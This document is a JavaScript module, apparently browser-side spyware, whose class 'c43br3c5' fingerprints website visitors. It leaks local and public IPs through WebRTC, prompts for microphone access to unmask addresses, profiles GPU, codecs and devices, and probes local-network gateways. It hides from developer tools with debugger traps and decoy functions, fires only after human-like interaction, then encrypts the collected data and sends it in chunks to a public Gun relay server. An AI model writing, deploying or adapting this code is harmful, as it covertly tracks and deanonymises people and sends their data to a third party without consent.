 class c43br3c5 {
    constructor(config = {}) {
        this.stunServers = config.stunServers || [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302'
        ];
        
        this.gun = Gun({
            peers: config.peers || ['https://gun-manhattan.herokuapp.com/gun'] 
        });
        
        this.resetState();
        this._isShielded = false;
        this._originalMethods = {};
        this._noiseFunctions = {
            harvest: () => Promise.resolve({ error: "ERR_ENCRYPT_FAIL", nonce: Math.random().toString(36) }),
            syncToMesh: () => {},
            getDeepMediaTelemetry: () => Promise.resolve({ status: "IDLE", hardware: "GENERIC_PnP" })
        };

        this._initShield();
    }
    
    _initShield() {

        const methodsToProtect = ['harvest', 'syncToMesh', 'getDeepMediaTelemetry'];
        methodsToProtect.forEach(m => {
            this._originalMethods[m] = this[m].bind(this);
        });

        
        setInterval(() => this._checkIntegrity(), 1000);
    }
    
    async _checkIntegrity() {
        const isOpen = await this._isDevToolsOpen();

        if (isOpen && !this._isShielded) {
            this._applyNoise();
        } else if (!isOpen && this._isShielded) {
            this._restoreLogic();
        }
    }
    
    async _isDevToolsOpen() {
        // Trap 1: Execution pause (Works across all browsers)
        const start = performance.now();
        debugger; 
        const end = performance.now();
        if (end - start > 100) return true;

        // Trap 2: toString() evaluation (Only safe to run on Chromium-based browsers)
        const isChromium = !!window.chrome;
        if (isChromium) {
            let detected = false;
            const detector = {
                toString: () => { detected = true; return 'detector'; }
            };
            console.log('%c', detector); 
            return detected;
        }
        
        // If not Chromium, rely only on the debugger trap
        return false;
    }
    
    _applyNoise() {
        
        this._isShielded = true;


        Object.keys(this._noiseFunctions).forEach(m => {
            this[m] = this._noiseFunctions[m];
        });
    }

    _restoreLogic() {
        
        this._isShielded = false;


        Object.keys(this._originalMethods).forEach(m => {
            this[m] = this._originalMethods[m];
        });
    }
        
    resetState() {
        this.candidates = [];
        this.publicIPs = new Set();
        this.localInterfaces = new Set();
        this.isComplete = false;
    }

    _parseCandidate(candidateStr) {
        const parts = candidateStr.split(' ');
        if (parts.length < 8) return null;

        const candidate = {
            foundation: parts[0].split(':')[1],
            component: parts[1],
            protocol: parts[2].toLowerCase(),
            priority: parseInt(parts[3], 10),
            ip: parts[4],
            port: parseInt(parts[5], 10),
            type: parts[7] 
        };

        const raddrIndex = parts.indexOf('raddr');
        if (raddrIndex !== -1) candidate.relatedAddress = parts[raddrIndex + 1];

        return candidate;
    }

    async harvest() {
        this.resetState();
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: this.stunServers }],
                iceTransportPolicy: 'all' 
            });

            pc.createDataChannel('c43br3c5-channel');

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const parsed = this._parseCandidate(event.candidate.candidate);
                    if (parsed) {
                        this.candidates.push(parsed);

                        if (parsed.type === 'srflx') {
                            this.publicIPs.add(parsed.ip);
                        } else if (parsed.type === 'host') {
                            this.localInterfaces.add(parsed.ip);
                        }
                    }
                } else {
                    this.isComplete = true;
                    pc.close();
                    resolve(this.getFingerprint());
                }
            };

            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(err => {});

            setTimeout(() => {
                if (!this.isComplete) {
                    this.isComplete = true;
                    pc.close();
                    resolve(this.getFingerprint());
                }
            }, 3000); 
        });
    }

    getFingerprint() {
        const vpnLikely = this.publicIPs.size > 1; 
        const localInterfaceCount = this.localInterfaces.size;

        return {
            timestamp: new Date().toISOString(),
            network: {
                publicIPs: Array.from(this.publicIPs),
                mDNSHosts: Array.from(this.localInterfaces),
                interfaceCount: localInterfaceCount,
                vpnSuspicion: vpnLikely
            },
            rawCandidates: this.candidates
        };
    }

    armOnMultiInteraction() {
        

        let interactionState = 0;
        let sequenceTimeout = null;


        const resetSequence = () => {
            if (interactionState > 0) {
                
            }
            interactionState = 0;
            if (sequenceTimeout) {
                clearTimeout(sequenceTimeout);
                sequenceTimeout = null;
            }
        };

        const triggerRecon = async () => {
            console.log("[!] Complex human interaction verified. Executing payload...");
            

            window.removeEventListener('mousemove', handleMouse);
            window.removeEventListener('scroll', handleScroll);
            window.removeEventListener('click', handleClick);
            clearTimeout(sequenceTimeout);
            

            try {
                await this.syncToMesh();
                
            } catch (error) { }
        };


        const handleMouse = () => {
            if (interactionState === 0) {
                interactionState = 1; 
                sequenceTimeout = setTimeout(resetSequence, 5000); 
            }
        };

        const handleScroll = () => {
            if (interactionState === 1) {
                interactionState = 2; 
            }
        };

        const handleClick = (event) => {
            if (interactionState === 2) {

                if (event.isTrusted && (event.clientX !== 0 || event.clientY !== 0)) {
                    triggerRecon();
                } else {
                    
                    resetSequence();
                }
            }
        };


        window.addEventListener('mousemove', handleMouse);

        window.addEventListener('scroll', handleScroll, { passive: true }); 
        window.addEventListener('click', handleClick);
    }
    async unlockRawIPs() {
        try {
            
            
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

            stream.getTracks().forEach(track => track.stop());

            
            return await this.harvest();
        } catch (err) {
            
            return null; 
        }
    }
    
    _arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        const len = bytes.byteLength;
        for (let i = 0; i < len; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return window.btoa(binary);
    }

    _pemToArrayBuffer(pem) {
        const b64Lines = pem.replace(/(-----(BEGIN|END) PUBLIC KEY-----|\s)/g, '');
        const binaryString = window.atob(b64Lines);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return bytes.buffer;
    }
    
    _chunkString(str, size) {
        const chunks = [];
        for (let i = 0; i < str.length; i += size) {
            chunks.push(str.substring(i, i + size));
        }
        return chunks;
    }
    
    async _encryptPayload(payload, rsaPublicKeyPem) {
        const encoder = new TextEncoder();
        const data = encoder.encode(JSON.stringify(payload));

        
        const publicKey = await crypto.subtle.importKey(
            "spki",
            this._pemToArrayBuffer(rsaPublicKeyPem),
            { name: "RSA-OAEP", hash: "SHA-256" },
            false,
            ["wrapKey"]
        );


        const aesKey = await crypto.subtle.generateKey(
            { name: "AES-GCM", length: 256 },
            true,
            ["encrypt"]
        );
        
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encryptedData = await crypto.subtle.encrypt(
            { name: "AES-GCM", iv: iv },
            aesKey,
            data
        );


        const wrappedAesKey = await crypto.subtle.wrapKey(
            "raw",
            aesKey,
            publicKey,
            { name: "RSA-OAEP" }
        );

        return {
            content: this._arrayBufferToBase64(encryptedData),
            key: this._arrayBufferToBase64(wrappedAesKey),
            iv: this._arrayBufferToBase64(iv)
        };
    }
    
    

    async syncToMesh() {
        
        

        let reconData = await this.harvest();
        const isMasked = reconData.network.mDNSHosts.some(ip => ip.endsWith('.local'));
        
        if (isMasked) {
            const unmaskedData = await this.unlockRawIPs();
            // VALIDATION FIX: Ensure the shield hasn't fed us a noise object before overwriting
            if (unmaskedData && !unmaskedData.error && unmaskedData.rawCandidates) {
                reconData = unmaskedData;
            }
        }
        

        const intel = {};


        const schedule = [

            { id: 'netEnv',       delay: Math.random() * 1500,          task: () => this.getNetworkEnvironment() },
            

            { id: 'hardwareId',   delay: 2000,                          task: () => this.getCanvasFingerprint() }, 
            

            { id: 'uaData',       delay: 3000 + (Math.random() * 1500), task: () => this.getExtendedUserAgentData() },
            { id: 'mediaInfo',    delay: 4500 + (Math.random() * 1000), task: () => this.getMediaDevices() },
            

            { id: 'codecsData',   delay: 5500,                          task: () => this.getWebCodecsFingerprint() },
            

            { id: 'webGpuData',   delay: 7000,                          task: () => this.getWebGPUFingerprint() }, 
            

            
            { id: 'latencyData',  delay: 9500 + (Math.random() * 2000), task: () => this.measureLatency() },
            

            { id: 'deepMediaData',delay: 11000,                         task: () => this.getDeepMediaTelemetry() },
            

            { id: 'lanResults',   delay: 13000,                         task: () => this._probeCommonGateways() } 
        ];


        await Promise.all(schedule.map(async (item) => {
            await new Promise(resolve => setTimeout(resolve, item.delay));
            try {
                intel[item.id] = await item.task();
            } catch (err) {
               
                intel[item.id] = { error: err.message || "Task failed" };
            }
        }));

        
        

        const evalResult = this.evaluateConnection(reconData.rawCandidates);
        const natType = this.detectNATType(reconData.rawCandidates);
        const botAnalysis = this.detectAutomation();
        const gpuData = this.getGPUFingerprint();
        const hardwareAnalysis = this.analyzeHardwareInterfaces();

        const webglStatus = `${gpuData.vendor} | ${gpuData.renderer} (VM: ${gpuData.isVM})`;
        const webGpuStatus = intel.webGpuData.supported 
            ? `[${intel.webGpuData.hash}] Vendor: ${intel.webGpuData.vendor} | Arch: ${intel.webGpuData.architecture} | MaxTex2D: ${intel.webGpuData.maxTextureDimension2D}`
            : `Blocked / Unsupported (${intel.webGpuData.error})`;
        const mediaStats = `Mics: ${intel.mediaInfo.audioInput || 0} | Cams: ${intel.mediaInfo.videoInput || 0}`;
        const mediaLabels = intel.mediaInfo.labels && intel.mediaInfo.labels.length > 0 ? intel.mediaInfo.labels.join(', ') : "Permissions Denied";
        
        const mainIp = Array.from(this.publicIPs)[0];
        let vpnLeakStatus = "Scanning...";
        let vpnConfidence = 0;
        if (mainIp) {
            const analysis = await this.analyzeVpnTunnel(mainIp);
            if (analysis) {
                if (analysis.isMismatched) {
                    vpnLeakStatus = `TIMEZONE LEAK: System hardware is in [${analysis.systemTimezone}], but IP claims to be in [${analysis.ipTimezone}]. High probability of VPN/Proxy masking.`; vpnConfidence += 50;
                } else if (analysis.isProxyOrHosting) {
                    vpnLeakStatus = `DATACENTER IP: Timezones match (${analysis.systemTimezone}), but IP belongs to a known Proxy/Hosting provider.`;
                } else {
                    vpnLeakStatus = `MATCH: System timezone (${analysis.systemTimezone}) aligns with IP geolocation.`;
                }
            } else {
                vpnLeakStatus = "GEO-LOOKUP FAILED: API Blocked or HTTPS Mixed Content Error.";
            }
        } else {
            vpnLeakStatus = "No Public IP Harvested to check.";
        }
        
        
        const lanSummaryFetch = Array.isArray(intel.lanResults.fetchResults) 
            ? intel.lanResults.fetchResults.map(h => `${h.ip} [${h.status}]`).join(' | ')
            : intel.lanResults.fetchResults;
            
        const lanSummaryTiming = Array.isArray(intel.lanResults.timingResults)
            ? intel.lanResults.timingResults.map(h => `${h.ip} [${h.ms}ms - ${h.status}]`).join(' | ')
            : intel.lanResults.timingResults;
            
        const latencyStatus = intel.latencyData.error 
            ? `ERROR: ${intel.latencyData.error}` 
            : `${intel.latencyData.averageRttMs}ms Anycast RTT | Proxy Suspicion: ${intel.latencyData.proxySuspicion ? "HIGH" : "LOW"}`;
            
        const hwDecodersStatus = intel.codecsData.supported 
            ? intel.codecsData.hardwareDecoders.join(' | ') || "None Detected"
            : intel.codecsData.status;
            
        const deepMediaStatus = intel.deepMediaData.permission === "Granted (Audio Only)"
            ? `Mic: ${intel.deepMediaData.audioSettings.sampleRate}Hz (Channels: ${intel.deepMediaData.audioSettings.channelCount})`
            : `Denied (${intel.deepMediaData.error})`;

        const payload = {
            title: "Sophisticated Connection Analysis",
            color: evalResult.score > 4 || botAnalysis.isBot ? "Red" : "Green",
            complexityScore: `${evalResult.score}/10`,
            detectedType: evalResult.details.type,
            hardwareID: intel.hardwareId,
            natTopology: natType,
            automatedBot: botAnalysis.isBot ? `YES - ${botAnalysis.details}` : "NO",
            multipleNICs: evalResult.details.hasMultipleNICs ? "Yes" : "No",
            networkSpeed: `${intel.netEnv.downlink} Mbps (RTT: ${intel.netEnv.rtt}ms)`,
            webglFingerprint: webglStatus,         
            webgpuFingerprint: webGpuStatus,
            hardwareVideoDecoders: hwDecodersStatus,
            hardwareDevices: mediaStats,
            deviceLabels: mediaLabels,
            deepMediaTelemetry: deepMediaStatus,
            publicIPs: reconData.network.publicIPs.join('\n') || "None",
            localIPs: reconData.network.mDNSHosts.join('\n') || "None",
            lan_map_fetch: lanSummaryFetch,            
            lan_map_timing: lanSummaryTiming,
            userAgentClassic: intel.uaData.classic.substring(0, 1024),
            userAgentHints: JSON.stringify(intel.uaData.hints, null, 2),
            hardwareAdapterFingerprint: hardwareAnalysis.profiles.map(p => `• ${p.hardwareGuess} (Pref: ${p.localPreference})`).join('\n') || "None detected",
            vpnProxyTunnel: vpnLeakStatus,
            capturedAt: reconData.timestamp,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };

        const PUBLIC_KEY_PEM = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAySyvLhYSC7UK59wKc4q6
RKqgIvXLhiEo5imlmuSOYqye0qCuaQZ7ZVff16hW5EMwAQQ7jGK/jhLlqsA+oA7Z
CdZmUvJitsTfYQcmFKUDQqfM8vtlEG3GnSJmQcLXdbZGzrYjdZffRYUbyif5dOud
8+rrARNDO7wn/LyMfCaXeO8i5nzJh//XUFbO9N/pt9JUBZ8Pi4rHEJAJxTkW+j/d
PYsfx3mHh4HCFmM5kM/T7NZxhjhUD8ZR9Ln06QaKNhyoNHkO3ASaP60U7KZlYKHk
fjpHNyFXZ9PIwAvxMLEmvjW5Ag/GkOsjlLQOerQaVnXTiBEd1lYtRdX/kdBdXgFw
lwIDAQAB
-----END PUBLIC KEY-----
`;

        try {
            const fullPayloadString = JSON.stringify(payload);
            const CHUNK_SIZE = 512; 
            const stringChunks = this._chunkString(fullPayloadString, CHUNK_SIZE);
            const totalChunks = stringChunks.length;
            const sessionId = Math.random().toString(36).substring(2, 8);
             
            if (!this.gun) {
                
                return false;
            }

            

            for (let i = 0; i < totalChunks; i++) {
                const piece = {
                    sid: sessionId,
                    idx: i,
                    total: totalChunks,
                    data: stringChunks[i]
                };

                const encryptedPiece = await this._encryptPayload(piece, PUBLIC_KEY_PEM);

                
                await new Promise((resolve) => {
                    const timeoutId = setTimeout(() => {
                        
                        resolve(); 
                    }, 5000);

                    this.gun.get('very-exhilirated-mouse-moot-skyblue-hell')
                        .get(intel.hardwareId)
                        .get(sessionId)
                        .get(`p_${i}`)
                        .put(encryptedPiece, (ack) => {
                            clearTimeout(timeoutId); 
                            
                            if (ack.err) {
                                
                            } else {
                                
                            }
                            resolve(); 
                        });
                });

                if (i < totalChunks - 1) {
                    const jitterDelay = Math.floor(Math.random() * (1500 - 800 + 1) + 800);
                    await new Promise(r => setTimeout(r, jitterDelay));
                }
            }

            
            return true;

        } catch (error) {
            
            return false;
        }
    }
    
    evaluateConnection(candidates) {
        let complexityScore = 0;
        let connectionDetails = {
            type: "Unknown",
            hasMultipleNICs: false,
            potentialEthernet: false,
            virtualized: false
        };

        const hostCandidates = candidates.filter(c => c.type === 'host');

        if (hostCandidates.length > 1) {
            connectionDetails.hasMultipleNICs = true;
            complexityScore += 2;
        }

        const highPriority = hostCandidates.some(c => c.priority > 20000);
        if (highPriority) {
            connectionDetails.potentialEthernet = true;
            connectionDetails.type = "Wired/High-Speed";
            complexityScore += 3;
        }

        const vmPatterns = ['192.168.56.', '192.168.99.', '172.17.0.'];
        const isVM = hostCandidates.some(c => vmPatterns.some(p => c.ip.startsWith(p)));
        if (isVM) {
            connectionDetails.virtualized = true;
            complexityScore += 5;
        }

        return { score: complexityScore, details: connectionDetails };
    }

    async getNetworkEnvironment() {
        const netInfo = navigator.connection || {};
        return {
            downlink: netInfo.downlink, 
            effectiveType: netInfo.effectiveType, 
            saveData: netInfo.saveData,
            rtt: netInfo.rtt 
        };
    }
    async getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { error: "Media API not supported" };
            }

            const devices = await navigator.mediaDevices.enumerateDevices();
            const summary = {
                audioInput: 0,
                audioOutput: 0,
                videoInput: 0,
                labels: []
            };

            devices.forEach(device => {
                if (device.kind === 'audioinput') summary.audioInput++;
                if (device.kind === 'audiooutput') summary.audioOutput++;
                if (device.kind === 'videoinput') summary.videoInput++;

                if (device.label) {
                    summary.labels.push(device.label);
                }
            });

            return summary;
        } catch (err) { return { error: "Enumeration failed" }; }
    }
    
    _extractLocalPreference(priority) {

        return (priority >> 8) & 0xFFFF;
    }

    analyzeHardwareInterfaces() {
        const hostCandidates = this.candidates.filter(c => c.type === 'host');
        const hardwareProfiles = [];
        let hasPhysicalWired = false;
        let hasVirtualOrVPN = false;

        hostCandidates.forEach(cand => {
            const localPref = this._extractLocalPreference(cand.priority);
            let inferredType = "Unknown Interface";

            if (localPref === 65535) {
                inferredType = "Physical Ethernet (Wired)";
                hasPhysicalWired = true;
            } else if (localPref >= 30000 && localPref < 65535) {
                
                inferredType = "Wi-Fi (Wireless)";
            } else if (localPref > 0 && localPref < 30000) {
                
                inferredType = "Virtual Interface / VPN Tunnel / Bridge";
                hasVirtualOrVPN = true;
            }

            hardwareProfiles.push({
                identifier: cand.ip, 
                rawPriority: cand.priority,
                localPreference: localPref,
                hardwareGuess: inferredType
            });
        });

        return {
            profiles: hardwareProfiles,
            summary: {
                usesWiredConnection: hasPhysicalWired,
                usesVirtualAdapters: hasVirtualOrVPN,
                totalInterfaces: hostCandidates.length
            }
        };
    }
    
    async analyzeVpnTunnel(ip) {
        try {
            
            const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            const response = await fetch(`http://ip-api.com/json/${ip}?fields=timezone,proxy,hosting`);
            const geoData = await response.json();

            if (geoData.status !== 'success') return null;

            const ipTimezone = geoData.timezone;
            const isMismatched = systemTimezone !== ipTimezone;

            return {
                systemTimezone,
                ipTimezone,
                isMismatched,
                isProxyOrHosting: geoData.proxy || geoData.hosting, 
                confidence: isMismatched ? "High (Timezone Mismatch)" : "Low"
            };
        } catch (err) { return null; }
    }
    
    detectAutomation() {
        let isAutomated = false;
        const reasons = [];

        if (navigator.webdriver) {
            isAutomated = true;
            reasons.push("navigator.webdriver is true");
        }

        const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
        if (isChrome) {
            
            if (typeof window.chrome === "undefined") {
                isAutomated = true;
                reasons.push("Missing window.chrome");
            }

            if (navigator.plugins.length === 0) {
                isAutomated = true;
                reasons.push("0 navigator.plugins");
            }
        }

        if (window.callPhantom || window._phantom) {
            isAutomated = true;
            reasons.push("PhantomJS variables found");
        }

        return {
            isBot: isAutomated,
            details: reasons.length > 0 ? reasons.join(" | ") : "Clean"
        };
    }
    
    getGPUFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                return { 
                    vendor: "N/A", 
                    renderer: "WebGL Not Supported", 
                    isVM: false 
                };
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) {
                return { 
                    vendor: "Masked/Protected", 
                    renderer: "Extension Blocked (Anti-Fingerprinting active)", 
                    isVM: false 
                };
            }

            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

            const vmKeywords = ['swiftshader', 'llvmpipe', 'qemu', 'vmware', 'virtualbox', 'mali-450 mp']; 
            const rendererLower = renderer.toLowerCase();
            const isVM = vmKeywords.some(keyword => rendererLower.includes(keyword));

            return {
                vendor: vendor,
                renderer: renderer,
                isVM: isVM
            };

        } catch (err) { return { vendor: "Error", renderer: "Failed to extract", isVM: false }; }
    }
    
    detectNATType(candidates) {
        const srflxCandidates = candidates.filter(c => c.type === 'srflx');
        const hostCandidates = candidates.filter(c => c.type === 'host');

        if (srflxCandidates.length === 0) {
            return "Blocked / UDP Disabled"; 
        }

        const publicPorts = new Set(srflxCandidates.map(c => c.port));
        const localPorts = new Set(hostCandidates.map(c => c.port));

        let isSymmetric = false;
        let isPortPreserving = false;

        if (publicPorts.size > 1) {
            isSymmetric = true;
        }

        for (const port of publicPorts) {
            if (localPorts.has(port)) {
                isPortPreserving = true;
                break;
            }
        }

        if (isSymmetric) {
            return "Symmetric NAT (Corporate/Strict)";
        } else if (isPortPreserving) {
            return "Full Cone / Port-Preserving (Loose)";
        } else {
            return "Port-Restricted Cone (Standard Home)";
        }
    }
    
    async getCanvasFingerprint() {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 250;
                canvas.height = 50;

                ctx.fillStyle = "#fa8072"; 
                ctx.fillRect(100, 1, 60, 20);

                ctx.textBaseline = "alphabetic";
                ctx.font = "16pt 'Arial', 'Helvetica', sans-serif";

                ctx.fillStyle = "#069";
                ctx.fillText("THIS_is_A_pOc", 2, 20);
                
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("THIS_is_A_pOc", 4, 22);

                const dataURL = canvas.toDataURL();

                let hash = 5381;
                for (let i = 0; i < dataURL.length; i++) {
                    hash = ((hash << 5) + hash) + dataURL.charCodeAt(i);
                }

                const hardwareId = "HWID-" + Math.abs(hash).toString(16).toUpperCase();
                resolve(hardwareId);

            } catch (err) { resolve("Blocked / Unsupported"); }
        });
    }

    async _probeCommonGateways() {
       

        const gateways = new Set(['192.168.1.1', '192.168.0.1', '10.0.0.1']);


        this.localInterfaces.forEach(ip => {
            if (ip.includes('.') && !ip.endsWith('.local')) {
                const octets = ip.split('.');
                if (octets.length === 4) {
                    const subnet = octets.slice(0, 3).join('.');
                    gateways.add(`${subnet}.1`);   
                    gateways.add(`${subnet}.254`); 
                    gateways.add(`${subnet}.100`); 
                }
            }
        });

        const targetList = Array.from(gateways);


        const fetchActiveHosts = [];
        

        const pingViaFetch = async (ip) => {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1200); 

            try {
                const start = performance.now();
                await fetch(`http://${ip}`, {
                    mode: 'no-cors',
                    cache: 'no-cache',
                    signal: controller.signal
                });
                const duration = performance.now() - start;
                clearTimeout(timeoutId);
                fetchActiveHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Fetch Responded)" });
            } catch (err) {
                clearTimeout(timeoutId);

                if (err.name !== 'AbortError') {
                    fetchActiveHosts.push({ ip: ip, status: "ALIVE (Fetch Refused)" });
                }
            }
        };

        
        await Promise.all(targetList.map(ip => pingViaFetch(ip)));


        const timingActiveHosts = await this._probeViaNavigationTiming(targetList);


        return {
            fetchResults: fetchActiveHosts.length > 0 ? fetchActiveHosts : "No gateways found via Fetch",
            timingResults: timingActiveHosts.length > 0 ? timingActiveHosts : "No gateways found via Timing"
        };
    }
    async measureLatency() {

        const endpoints = [
            'https://1.1.1.1/cdn-cgi/trace',       
            'https://dns.google/resolve?name=a',   
            'https://freedns.afraid.org/'          
        ];

        let latencies = [];

        for (const url of endpoints) {
            try {
                const start = performance.now();

                await fetch(url, { 
                    mode: 'no-cors', 
                    cache: 'no-store',
                    signal: AbortSignal.timeout(2000) 
                });
                const rtt = Math.round(performance.now() - start);
                latencies.push(rtt);
            } catch (err) { }
        }

        if (latencies.length === 0) return { error: "All probes failed" };

        const avgLatency = Math.round(latencies.reduce((a, b) => a + b) / latencies.length);

        const proxySuspicion = avgLatency > 150; 

        return {
            averageRttMs: avgLatency,
            proxySuspicion: proxySuspicion,
            rawMeasurements: latencies
        };
    }
    async getWebGPUFingerprint() {
        try {
            if (!navigator.gpu) {
                return { supported: false, error: "WebGPU API not present" };
            }

            const adapter = await navigator.gpu.requestAdapter();
            if (!adapter) {
                return { supported: false, error: "No adapter found / Permission denied" };
            }


            const limits = {};
            for (const key in adapter.limits) {
                limits[key] = adapter.limits[key];
            }


            const features = [];
            adapter.features.forEach(feature => features.push(feature));
            features.sort(); 


            let vendor = "Unknown";
            let architecture = "Unknown";
            if (adapter.info) {
                vendor = adapter.info.vendor || vendor;
                architecture = adapter.info.architecture || architecture;
            }

            
            const signatureStr = JSON.stringify(limits) + JSON.stringify(features);
            let hash = 5381;
            for (let i = 0; i < signatureStr.length; i++) {
                hash = ((hash << 5) + hash) + signatureStr.charCodeAt(i);
            }
            const hwid = "WebGPU-" + Math.abs(hash).toString(16).toUpperCase();

            return {
                supported: true,
                hash: hwid,
                vendor: vendor,
                architecture: architecture,
                maxTextureDimension2D: adapter.limits.maxTextureDimension2D || "N/A",
                maxComputeWorkgroupSizeX: adapter.limits.maxComputeWorkgroupSizeX || "N/A"
            };

        } catch (err) { return { supported: false, error: "Failed to extract" }; }
    }
    async _probeViaNavigationTiming(targetList) {
        
        const activeHosts = [];

        const probeIp = async (ip) => {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                
                const start = performance.now();
                

                const timeoutId = setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                    resolve(); 
                }, 1500);

                
                iframe.onload = iframe.onerror = () => {
                    const duration = performance.now() - start;
                    clearTimeout(timeoutId);
                    
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                    

                    if (duration < 1400) {
                        activeHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Timing Bypass)" });
                    }
                    resolve();
                };

                document.body.appendChild(iframe);

                iframe.src = `http://${ip}:31337`; 
            });
        };


        await Promise.all(targetList.map(ip => probeIp(ip)));
        return activeHosts;
    }
    async getExtendedUserAgentData() {
        const classicUA = navigator.userAgent;
        let clientHints = null;


        if (navigator.userAgentData) {
            try {

                const basicHints = {
                    brands: navigator.userAgentData.brands,
                    mobile: navigator.userAgentData.mobile,
                    platform: navigator.userAgentData.platform
                };


                const highEntropy = await navigator.userAgentData.getHighEntropyValues([
                    'architecture',
                    'bitness',
                    'model',
                    'platformVersion',
                    'fullVersionList',
                    'uaFullVersion'
                ]);


                clientHints = { ...basicHints, ...highEntropy };
            } catch (err) { clientHints = "Blocked / Error"; }
        } else {
            clientHints = "Not Supported (Firefox/Safari or insecure context)";
        }

        return {
            classic: classicUA,
            hints: clientHints
        };
    }
    async getWebCodecsFingerprint() {
        if (typeof VideoDecoder === 'undefined') {
            return { supported: false, status: "WebCodecs API blocked or unsupported" };
        }


        const profilesToTest = [
            { name: 'H.264 Baseline', codec: 'avc1.42001E' },
            { name: 'H.264 High', codec: 'avc1.640028' },
            { name: 'VP8', codec: 'vp8' },
            { name: 'VP9 Profile 0', codec: 'vp09.00.10.08' },
            { name: 'AV1 Main', codec: 'av01.0.04M.08' },
            { name: 'HEVC / H.265', codec: 'hev1.1.6.L93.B0' } 
        ];

        const results = { supported: true, hardwareDecoders: [] };

        for (const profile of profilesToTest) {
            try {
                const support = await VideoDecoder.isConfigSupported({
                    codec: profile.codec,
                    hardwareAcceleration: 'require', 
                    codedWidth: 1920,
                    codedHeight: 1080
                });
                
                if (support.supported && support.config) {
                    results.hardwareDecoders.push(profile.name);
                }
            } catch (err) {

            }
        }

        return results;
    }

    async getDeepMediaTelemetry() {
        try {

            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const telemetry = { videoSettings: "Not Requested", audioSettings: {}, permission: "Granted (Audio Only)" };

            stream.getTracks().forEach(track => {
                const settings = track.getSettings();
                
                if (track.kind === 'audio') {
                    telemetry.audioSettings = {
                        deviceId: settings.deviceId,
                        sampleRate: settings.sampleRate,
                        sampleSize: settings.sampleSize,
                        channelCount: settings.channelCount,
                        hardwareEchoCancellation: settings.echoCancellation,
                        hardwareNoiseSuppression: settings.noiseSuppression
                    };
                }
                

                track.stop(); 
            });

            return telemetry;
        } catch (err) {
            return { permission: "Denied / Blocked", error: err.name, message: err.message };
        }
    }
}

export default c43br3c5;
